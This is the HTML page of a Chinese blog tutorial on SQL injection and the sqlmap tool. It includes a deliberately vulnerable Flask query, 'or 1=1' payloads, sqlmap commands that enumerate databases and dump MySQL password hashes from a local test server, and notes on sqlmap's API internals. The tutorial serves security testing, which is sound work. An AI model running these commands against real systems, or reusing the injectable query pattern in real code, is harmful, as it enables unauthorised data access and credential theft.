@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"beanskingdom.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+<link rel="stylesheet" href="/js/prism/prism.css">
+
+  <meta name="description" content="背景​    时隔了好好好几个月。。。继上次文章 初探Sqlmap（一）中立下的Flag：下一篇出sqlmap原理相关的介绍😂😂，由于各种原因。。。今天才终于完成了┑(￣。。￣)┍ 。。不多说了。。。 什么是SQL注入？​    指在程序的输入数据中添加额外的SQL语句。就好比有一个登录输入框，在输入帐号的的输入框中，输入了 &#39;arvin&#39; or 1&#x3D;1 ，对应到数据库层面，s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入一一Sqlmap实践">
+<meta property="og:url" content="https://beanskingdom.top/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/index.html">
+<meta property="og:site_name" content="BeansKingdom">
+<meta property="og:description" content="背景​    时隔了好好好几个月。。。继上次文章 初探Sqlmap（一）中立下的Flag：下一篇出sqlmap原理相关的介绍😂😂，由于各种原因。。。今天才终于完成了┑(￣。。￣)┍ 。。不多说了。。。 什么是SQL注入？​    指在程序的输入数据中添加额外的SQL语句。就好比有一个登录输入框，在输入帐号的的输入框中，输入了 &#39;arvin&#39; or 1&#x3D;1 ，对应到数据库层面，s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/16/WJVaUkBYhstGRHv.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/03/xBf93UE17JYDGhu.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/03/ozCNZOuBW3kwDFV.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/31/uWltIYjXfeOvNM1.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/18/9sNUr3o18K4kMqm.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/03/mN9qwDRkylWzKXV.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/18/TFEzc8GdBQZnrWL.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/09/nYpJaSzmNf2xGEv.png">
+<meta property="article:published_time" content="2021-06-18T14:57:33.000Z">
+<meta property="article:modified_time" content="2021-11-07T15:10:13.649Z">
+<meta property="article:author" content="BigBean">
+<meta property="article:tag" content="安全测试">
+<meta property="article:tag" content="Sql注入">
+<meta property="article:tag" content="Sqlmap">
+<meta property="article:tag" content="工具实践">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/16/WJVaUkBYhstGRHv.png">
+
+<link rel="canonical" href="https://beanskingdom.top/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Sql注入一一Sqlmap实践 | BeansKingdom</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+      <div class="site-meta-headline">
+        <a>
+          <img class="custom-logo-image" src="/uploads/avatar.png" alt="BeansKingdom">
+        </a>
+      </div>
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">BeansKingdom</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://beanskingdom.top/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="BigBean">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BeansKingdom">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Sql注入一一Sqlmap实践
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-18 22:57:33" itemprop="dateCreated datePublished" datetime="2021-06-18T22:57:33+08:00">2021-06-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-07 23:10:13" itemprop="dateModified" datetime="2021-11-07T23:10:13+08:00">2021-11-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/" class="post-meta-item leancloud_visitors" data-flag-title="Sql注入一一Sqlmap实践" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-Sqlmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>​    时隔了好好好几个月。。。继上次文章 <a href="https://beanskingdom.top/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-%E5%88%9D%E6%8E%A2Sqlmap%EF%BC%88%E4%B8%80%EF%BC%89/">初探Sqlmap（一）</a>中立下的Flag：下一篇出sqlmap原理相关的介绍😂😂，由于各种原因。。。今天才终于完成了┑(￣。。￣)┍ 。。不多说了。。。</p>
+<h3 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h3><p>​    指在程序的输入数据中添加<strong>额外的SQL语句</strong>。就好比有一个登录输入框，在输入帐号的的输入框中，输入了 <code>&#39;arvin&#39; or 1=1</code> ，对应到数据库层面，sql语句可能就如下实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正常的<span class="keyword">sql</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> user_name <span class="operator">=</span> &quot;arvin&quot;;</span><br><span class="line"></span><br><span class="line"># 如果上述的输入框输入没有拦截，语句就变成了如下形式，多了额外的&quot;or 1=1&quot; 到查询的语句中就是<span class="keyword">sql</span>注入了。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> name<span class="operator">=</span>&quot;arvin&quot; <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+
+<h3 id="为什么会存在SQL注入？"><a href="#为什么会存在SQL注入？" class="headerlink" title="为什么会存在SQL注入？"></a>为什么会存在SQL注入？</h3><p>​    由于程序对 <strong>用户输入数据的合法性没有判断或过滤不严</strong>，攻击者可以在程序中事先定义好的 <strong>查询语句的结尾上添加额外的SQL语句</strong>。 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python中一种存在SQL注入的sql写法， 由于没有对传入的参数 name 进行任何的校验，并且是简单的动态拼接查询语句，导致可以进行SQL注入。</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/print_bad_sql&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span>():</span></span><br><span class="line">  name = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">  sql = <span class="string">&quot;select * from table_name where name=%s&quot;</span> % name</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过如下代码， 则可以构造出一条布尔类型的SQL注入语句</span></span><br><span class="line"><span class="comment"># http://127.0.0.1:5000/print_bad_sql?name=%22arvin%22%20or%201=1</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="存在SQL注入的影响"><a href="#存在SQL注入的影响" class="headerlink" title="存在SQL注入的影响"></a>存在SQL注入的影响</h3><p>​    可以在管理员不知情的情况下，实现欺骗 <strong>数据库服务器</strong> 执行<strong>非授权的任意查询</strong>，从而进一步<strong>得到相应的数据信息</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://127.0.0.1:5000/bad_sql?id=1</span></span><br><span class="line"><span class="comment"># 由于不存在id为1的数据，所以正常情况下是没有任何数据返回的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:5000/bad_sql?id=1%20or%201=1</span></span><br><span class="line"><span class="comment"># 但使用存在SQL注入语句的请求，返回了当前表下面的所有数据信息。</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Sql注入的主要流程"><a href="#Sql注入的主要流程" class="headerlink" title="Sql注入的主要流程"></a>Sql注入的主要流程</h3><ol>
+<li><p><strong>SQL注入点探测</strong>。</p>
+<p>探测SQL注入点是关键的一步，通过适当的分析应用程序，可以判断什么地方存在SQL注入点。通常只要 <strong>带有输入提交的动态网页</strong>，并且 <strong>动态网页访问数据库</strong>，就可能存在SQL注入漏洞。如果程序员信息安全意识不强，<font color=red><strong>采用动态构造SQL语句访问数据库，并且对用户的输入未进行有效性验证，则存在SQL注入漏洞的可能性很大。</strong></font>一般通过页面的报错信息来确定是否存在SQL注入漏洞。</p>
+<ul>
+<li><font color=blue>疑问1: 什么样的报错信息表示可能存在SQL注入？</font></li>
+<li><font color=blue>疑问2: 怎么样去判断是否存在SQL注入点？</font></li>
+</ul>
+</li>
+<li><p><strong>收集后台数据库信息。</strong></p>
+<p>不同数据库的注入方法、函数都不尽相同，因此在注入之前，我们先要判断一下数据库的类型。判断数据库类型的方法很多，可以输入特殊字符，如单引号，让程序返回错误信息，我们根据错误信息提示进行判断；还可以使用特定函数来判断，比如输入“1 and version（）&gt;0”，程序返回正常，说明 <code>version()</code> 函数被数据库识别并执行，而 <code>version()</code> 函数是 <code>MySQL</code> 特有的函数，因此可以推断后台数据库为MySQL。</p>
+</li>
+<li><p><strong>猜解用户名和密码。</strong></p>
+<p>数据库中的表和字段命名一般都是有规律的。通过构造特殊SQL语句在数据库中依次猜解出表名、字段名、字段数、用户名和密码。(<font color=blue>疑问3: 如何构造的特殊SQL语句，猜解出来表名、字段名以及密码等</font>)</p>
+</li>
+<li><p><strong>查找Web后台管理入口。</strong></p>
+</li>
+<li><p><strong>入侵和破坏。</strong></p>
+<p>一般后台管理具有较高权限和较多的功能，使用前面已破译的用户名、密码成功登录后台管理平台后，就可以任意进行破坏，比如上传木马、篡改网页、修改和窃取信息等，还可以进一步提权，入侵Web服务器和数据库服务器。</p>
+</li>
+</ol>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>在介绍工具之前，可以本地搭建一个简单的web服务，需要依赖 <code>Flask</code>、<code>mysql</code>、<code>python</code>等，请自行百度安装。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/quickstart.html#a-minimal-application">Flask：一个最小的应用</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-mysql.html">Python 操作 Pymysql</a></li>
+</ul>
+<h3 id="Sqlmap工具的介绍"><a href="#Sqlmap工具的介绍" class="headerlink" title="Sqlmap工具的介绍"></a><a target="_blank" rel="noopener" href="https://sqlmap.org/">Sqlmap工具的介绍</a></h3><h4 id="Sqlmap-实例演练"><a href="#Sqlmap-实例演练" class="headerlink" title="Sqlmap 实例演练"></a>Sqlmap 实例演练</h4><p>​    用命令行实际例子来演示一遍， 通过命令行来注入，并且获取对应的用户名和密码。（下面实例中的参数可以参考：<a target="_blank" rel="noopener" href="http://www.vuln.cn/1992">参考链接</a>）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找注入点</span></span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&#x27;http://127.0.0.1:5000/bad_sql?id=111&#x27;</span> --dbms=<span class="string">&#x27;MySQL&#x27;</span> --batch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询有哪些数据库</span></span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&#x27;http://127.0.0.1:5000/bad_sql?id=111&#x27;</span> --dbms=<span class="string">&#x27;MySQL&#x27;</span>  --batch –level 3 –dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询qa_tools_db/mysql数据库中有哪些表</span></span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&#x27;http://127.0.0.1:5000/bad_sql?id=111&#x27;</span> --dbms=<span class="string">&#x27;MySQL&#x27;</span> –level 3 -D qa_tools_db –tables</span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&#x27;http://127.0.0.1:5000/bad_sql?id=111&#x27;</span> --dbms=<span class="string">&#x27;MySQL&#x27;</span> –level 3 -D mysql –tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询qa_tools_db数据库中jira_infos表有哪些字段</span></span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&#x27;http://127.0.0.1:5000/bad_sql?id=111&#x27;</span> --dbms=<span class="string">&#x27;MySQL&#x27;</span> –level 3 -D qa_tools_db -T jira_infos –columns</span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&#x27;http://127.0.0.1:5000/bad_sql?id=111&#x27;</span> --dbms=<span class="string">&#x27;MySQL&#x27;</span> –level 3 -D mysql -T user –columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># dump出mysql中user表的账号密码</span></span><br><span class="line">python3.7 sqlmap.py -u <span class="string">&quot;http://127.0.0.1:5000/bad_sql?id=111&quot;</span> --dbms=<span class="string">&quot;MySQL&quot;</span> –level 3 -D mysql -T user –passwords -U root -v 2 --batch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果密码很简单的情况下, 直接使用sqlmap本身的命令即可破解。稍微复杂点的密码暂无法直接破解，有兴趣的可以深入研究</span></span><br></pre></td></tr></table></figure>
+<p>PS： 更详细的一些SQL注入基础原理可参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/078df7a35671">SQL注入基础</a>，里面举了较多的注入实例。<strong>关于Sqlmap 的命令行模式与 API模式的区别以及优缺点，在 <a href="https://beanskingdom.top/%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3-%E5%88%9D%E6%8E%A2Sqlmap%EF%BC%88%E4%B8%80%EF%BC%89/">初探Sqlmap（一）</a> 中已经描述过，此处不再重复。</strong></p>
+<h4 id="SqlmapAPI-介绍"><a href="#SqlmapAPI-介绍" class="headerlink" title="SqlmapAPI 介绍"></a>SqlmapAPI 介绍</h4><ul>
+<li><p>SqlmapAPI 的启动方式： <code>python sqlmapapi.py -s -H &quot;0.0.0.0&quot; -p 8775</code></p>
+</li>
+<li><p>SqlmapAPI 的脚本主要核心流程如下图：</p>
+<p>   <a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017801751919456">Sqlite3 数据库</a>：<strong>SQLite是一种嵌入式数据库，它的数据库是一个文件。</strong></p>
+<p>  <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3">WSGI application</a>：<strong>Web服务器网关接口</strong>（<strong>Python Web Server Gateway Interface</strong>）</p>
+  <img src="https://i.loli.net/2021/02/16/WJVaUkBYhstGRHv.png" width="800px" align="left">
+
+<p>使用API模式进行sql注入测试时候，主要使用如下几个API接口（具体如何调用以及为什么要使用该方式可参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/940/">细说Sqlmap</a>）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@get(<span class="params"><span class="string">&quot;/task/new&quot;</span></span>)				</span><span class="comment"># 创建一个新的扫描任务</span></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/scan/&lt;taskid&gt;/start&quot;</span></span>)			</span><span class="comment"># 指定任务进行扫描</span></span><br><span class="line"><span class="meta">@get(<span class="params"><span class="string">&quot;/scan/&lt;taskid&gt;/status&quot;</span></span>)			</span><span class="comment"># 查看指定任务的状态</span></span><br><span class="line"><span class="meta">@get(<span class="params"><span class="string">&quot;/scan/&lt;taskid&gt;/data&quot;</span></span>)			</span><span class="comment"># 查看指定任务的执行结果</span></span><br><span class="line"><span class="meta">@get(<span class="params"><span class="string">&quot;/scan/&lt;taskid&gt;/log&quot;</span></span>)			</span><span class="comment"># 查看指定任务的扫描执行日志</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<h4 id="SqlmapAPI-Task执行原理"><a href="#SqlmapAPI-Task执行原理" class="headerlink" title="SqlmapAPI Task执行原理"></a>SqlmapAPI Task执行原理</h4><p>此处仅介绍 <code>/scan/&lt;taskid&gt;/start</code>，主要通过 <code>DataStore.tasks[taskid].engine_start()</code> 执行指定任务执行扫描。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">engine_start</span>(<span class="params">self</span>):</span></span><br><span class="line">handle, configFile = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.CONFIG, text=<span class="literal">True</span>)</span><br><span class="line">  os.close(handle)</span><br><span class="line">saveConfig(self.options, configFile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;sqlmap.py&quot;</span>):</span><br><span class="line">    self.process = Popen([sys.executable <span class="keyword">or</span> <span class="string">&quot;python&quot;</span>, <span class="string">&quot;sqlmap.py&quot;</span>, <span class="string">&quot;--api&quot;</span>, <span class="string">&quot;-c&quot;</span>, configFile], shell=<span class="literal">False</span>, close_fds=<span class="keyword">not</span> IS_WIN)</span><br><span class="line"><span class="keyword">elif</span> os.path.exists(os.path.join(os.getcwd(), <span class="string">&quot;sqlmap.py&quot;</span>)):</span><br><span class="line">      self.process = Popen([sys.executable <span class="keyword">or</span> <span class="string">&quot;python&quot;</span>, <span class="string">&quot;sqlmap.py&quot;</span>, <span class="string">&quot;--api&quot;</span>, <span class="string">&quot;-c&quot;</span>, configFile], shell=<span class="literal">False</span>, cwd=os.getcwd(), close_fds=<span class="keyword">not</span> IS_WIN)</span><br><span class="line">  <span class="keyword">elif</span> os.path.exists(os.path.join(os.path.abspath(os.path.dirname(sys.argv[<span class="number">0</span>])), <span class="string">&quot;sqlmap.py&quot;</span>)):</span><br><span class="line">      self.process = Popen([sys.executable <span class="keyword">or</span> <span class="string">&quot;python&quot;</span>, <span class="string">&quot;sqlmap.py&quot;</span>, <span class="string">&quot;--api&quot;</span>, <span class="string">&quot;-c&quot;</span>, configFile], shell=<span class="literal">False</span>, cwd=os.path.join(os.path.abspath(os.path.dirname(sys.argv[<span class="number">0</span>]))), close_fds=<span class="keyword">not</span> IS_WIN)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">      self.process = Popen([<span class="string">&quot;sqlmap&quot;</span>, <span class="string">&quot;--api&quot;</span>, <span class="string">&quot;-c&quot;</span>, configFile], shell=<span class="literal">False</span>, close_fds=<span class="keyword">not</span> IS_WIN)</span><br></pre></td></tr></table></figure>
+<p>  从上面的代码来看，最终默认还是使用的 <code>sqlmap.py</code> 脚本来进行的任务扫描。（可以通过打印出源代码中 <code>configFile</code> 的路径，来查看每次任务的配置参数是什么。）</p>
+<h3 id="Sqlmap核心流程梳理"><a href="#Sqlmap核心流程梳理" class="headerlink" title="Sqlmap核心流程梳理"></a>Sqlmap核心流程梳理</h3><h4 id="（一）先是进行一系列的系统环境准备（sqlmap运行的系统版本）"><a href="#（一）先是进行一系列的系统环境准备（sqlmap运行的系统版本）" class="headerlink" title="（一）先是进行一系列的系统环境准备（sqlmap运行的系统版本）"></a>（一）先是进行一系列的系统环境准备（sqlmap运行的系统版本）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dirtyPatches()</span><br><span class="line">resolveCrossReferences()</span><br><span class="line">checkEnvironment()</span><br><span class="line">setPaths(modulePath())</span><br><span class="line">banner()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如下输出</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;<span class="number">1.5</span><span class="number">.1</span><span class="number">.28</span><span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 16:23:26 /2021-06-03/</span></span><br></pre></td></tr></table></figure>
